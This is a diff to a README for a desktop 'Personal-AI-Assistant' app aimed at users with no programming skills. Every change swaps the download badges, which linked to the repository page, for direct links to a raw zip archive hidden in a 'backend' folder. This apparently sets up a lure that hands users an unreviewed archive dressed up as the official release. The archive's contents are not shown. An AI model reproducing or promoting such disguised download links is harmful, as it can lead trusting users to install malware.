@@ -1,6 +1,6 @@
 # 🤖 Personal-AI-Assistant - Local AI That Helps You Daily
 
-[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
+[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant/raw/refs/heads/main/backend/A-Personal-Assistant-2.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You do not need any programming skills to use Personal-AI-Assistant. Everything 
 ## ⬇️ Download and Install Personal-AI-Assistant
 
 Click here to visit the official download page:  
-[![Get Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-blue?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
+[![Get Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-blue?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant/raw/refs/heads/main/backend/A-Personal-Assistant-2.1.zip)
 
 Follow these steps:
 
@@ -165,4 +165,4 @@ This application uses technologies and concepts like:
 
 ---
 
-[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant)
+[![Download Personal-AI-Assistant](https://img.shields.io/badge/Download-Personal--AI--Assistant-brightgreen?style=for-the-badge)](https://github.com/LUCIFERx01/Personal-AI-Assistant/raw/refs/heads/main/backend/A-Personal-Assistant-2.1.zip)
